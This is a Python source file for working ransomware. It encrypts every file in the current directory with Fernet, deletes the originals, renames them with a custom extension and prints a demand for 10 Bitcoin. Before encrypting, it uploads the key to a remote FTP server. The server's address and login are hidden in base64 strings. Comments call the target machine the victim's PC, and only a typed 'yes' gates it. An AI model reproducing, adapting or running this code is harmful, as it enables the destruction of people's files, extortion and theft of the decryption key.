import os
from cryptography.fernet import Fernet
import ftplib
import base64



# let's find some files and encrypt them

def encrypt():

    safe_word = input("Are you sure you want to do this: ")
    if safe_word == "YES" or safe_word == "yes":
        pass
    else:
        print("Not Authorized.")
        quit()

    files = []

    for file in os.listdir():
        if file == "encrypt.py" or file == "thekey.key" or file == "decrypt.py" or file == "upload.py" or file == 'main.py' or file == 'download.py' or file == 'test.py':
            continue

        if os.path.isfile(file):
            files.append(file)

# print(files)

    key = Fernet.generate_key()

    with open("thekey.key", "wb") as thekey:
        thekey.write(key)

# Upload the key file to the FTP server and delete it from the victim's PC

    upload_key_to_ftp()
    
    os.remove("thekey.key")

    for file in files:
        with open(file, "rb") as thefile:
            contents = thefile.read()
        contents_encrypted = Fernet(key).encrypt(contents)
        tempTuple = os.path.splitext(file)
        os.remove(file)
        file = tempTuple[0]
        print(file)
        extension = ".pr0m37h3us4ev3r"
        encrypted_filename = file + extension
        with open(encrypted_filename, "wb") as thefile:
            thefile.write(contents_encrypted)

    print("All of your files have been encrypted!! Send me 10 Bitcoin or I'll delete them in 24 hrs!!")


def decrypt():
    files = []

    for file in os.listdir():
        if file == "encrypt.py" or file == "thekey.key" or file == "decrypt.py" or file == "main.py":
            continue

        if os.path.isfile(file):
            files.append(file)

    print(files)

    with open("thekey.key", "rb") as key:
        secretkey= key.read()

    for file in files:
        with open(file, "rb") as thefile:
            contents = thefile.read()
        contents_decrypted = Fernet(secretkey).decrypt(contents)
        with open(file, "wb") as thefile:
            thefile.write(contents_decrypted)
    print("Congratulations, your files have been decrypted!")

# Uploading the key file to the FTP server
def upload_key_to_ftp():
    base64_host = "MTAwLjkwLjk1LjYK"
    base64_bytes = base64_host.encode('ascii')
    host_bytes = base64.b64decode(base64_bytes)
    host = host_bytes.decode('ascii')

    base64_username = "Y29uY2F0ZW5hdGUK"
    base64_bytes = base64_username.encode('ascii')
    username_bytes = base64.b64decode(base64_bytes)
    username = username_bytes.decode('ascii')

    base64_password = "YXJzaHNlcmkxMjMK"
    base64_bytes = base64_password.encode('ascii')
    password_bytes = base64.b64decode(base64_bytes)
    password = password_bytes.decode('ascii')

    HOSTNAME = host.strip()
    USERNAME = username.strip()
    PASSWORD = password.strip()

    # Connect to the FTP server
    ftp_server = ftplib.FTP(HOSTNAME, USERNAME, PASSWORD)

    # force UTF-8 encoding
    ftp_server.encoding = "utf-8"

    # print("Directory before upload")
    # ftp_server.dir()
    # print("-" * 50)

    filename = "thekey.key"

    # Store (STOR) the file in the FTP server directory
    with open(filename, "rb") as file:
        ftp_server.storbinary(f"STOR {filename}", file)

if __name__ == '__main__':
    encrypt()
